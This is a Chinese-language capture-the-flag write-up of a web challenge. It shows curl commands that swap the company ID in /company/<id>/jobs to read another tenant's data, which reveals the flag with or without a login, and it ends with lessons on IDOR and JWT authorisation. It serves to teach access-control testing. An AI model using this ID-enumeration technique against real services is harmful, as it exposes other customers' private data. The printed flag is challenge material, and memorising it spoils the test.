## 题解

### 入口与指纹

`uvicorn`，`GET /` 是登录页，页面上直接给演示账号：

```text
Username: demo, Password: demo
```

表单 POST 到 `/token`。登录成功返回 `303 -> /company/1/jobs`，并下发 JWT cookie：

```http
set-cookie: access_token="Bearer eyJhbGciOiJIUzI1NiIs..."; HttpOnly; Path=/; SameSite=lax
```

JWT 载荷只有 `{"sub":"demo","exp":...}`，**没有公司/租户字段**。

### 关键观察

**1. 路由把公司 ID 放在路径里：`/company/<id>/jobs`。**

登录后拿到的是 `/company/1/jobs`，渲染 `Jobs for Company 1`。把 `1` 换成 `2`：

```bash
curl -sS -b cj http://$T/company/2/jobs
```

页面是 `Jobs for Company 2`，最后一条列表项直接写着：

```html
<p>secret:flag{7ae66882-088f-4c40-ae11-3b5eadae8deb}</p>
```

**2. 这个接口连登录都不需要。**

不带 cookie 请求 `/company/2/jobs` 同样返回 200 和同一份内容。也就是说 JWT 只是登录流程的产物，`/company/<id>/jobs` 既不校验会话，也不校验公司归属。

`/company/3/jobs` 返回空列表（公司存在但没有 job），说明 `id` 是直接查库的，没有白名单。

### 利用链

```bash
T=$(head -1 .target)
# 不需要登录
curl -sS "http://$T/company/2/jobs" | grep -o 'flag{[^}]*}'
# flag{7ae66882-088f-4c40-ae11-3b5eadae8deb}
```

登录后带 cookie 请求结果相同；题目只要求读到别家公司的数据。

### flag 位置

公司 2 的 jobs 列表里那条 `secret:` 记录。它不是登录响应，也不在 JWT 里。

## 复盘

- **自增 ID 放在路径里时，第一件事就是换 ID。** `/company/1/jobs` 看到 `1`，立刻试 `2`、`3`；成本一个请求。
- **「拿到 JWT」不等于「接口做了鉴权」。** 本题连 cookie 都不需要，说明鉴权只存在于登录页的叙事里。
- **JWT 载荷没有租户字段是关键信号。** 服务端若真的按身份过滤，就必须从 token 里取公司 ID；token 里没有，就只能信任 URL 里的那个数字。
- 别在登录后只顺着 UI 走。UI 里公司 1 的两个 job 都是 `demo Job`，真正有价值的数据在相邻的 ID 上。
